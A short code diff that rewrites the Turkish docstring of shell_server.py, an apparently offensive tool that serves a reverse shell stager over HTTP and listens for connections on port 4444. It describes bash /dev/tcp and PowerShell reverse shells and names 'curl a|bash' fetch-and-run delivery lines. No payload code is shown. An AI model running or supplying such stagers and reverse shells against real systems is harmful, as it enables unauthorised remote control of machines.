@@ -1,24 +1,11 @@
 #!/usr/bin/env python3
 """
-PHP2Shell - Cross-Platform Shell Server
+Reverse shell listener + HTTP stager — Linux (bash) ve Windows (PowerShell).
 
-Hem Linux hem Windows hedefleri icin reverse shell altyapisi.
-Uc servis calistirir:
-  :80   HTTP stager  ->  OS'e gore uygun reverse shell script'i doner
-  :4444 TCP listener ->  Shell baglantisini kabul eder
+:80   stager (curl a|bash veya curl a/w|cmd)
+:4444 listener
 
-OS Tespiti:
-  - Baglanti geldiginde otomatik OS tespiti yapar
-  - Linux: bash /dev/tcp reverse shell
-  - Windows: PowerShell reverse shell
-
-Kullanim:
-  python3 shell_server.py [--lhost IP] [--lport PORT] [--stager-port PORT]
-
-Ortam degiskenleri:
-  LHOST        Listener IP (varsayilan: otomatik tespit)
-  LPORT        Listener port (varsayilan: 4444)
-  STAGER_PORT  HTTP stager port (varsayilan: 80)
+    python3 shell_server.py --lhost 10.0.0.1 --lport 4444
 """
 
 import argparse
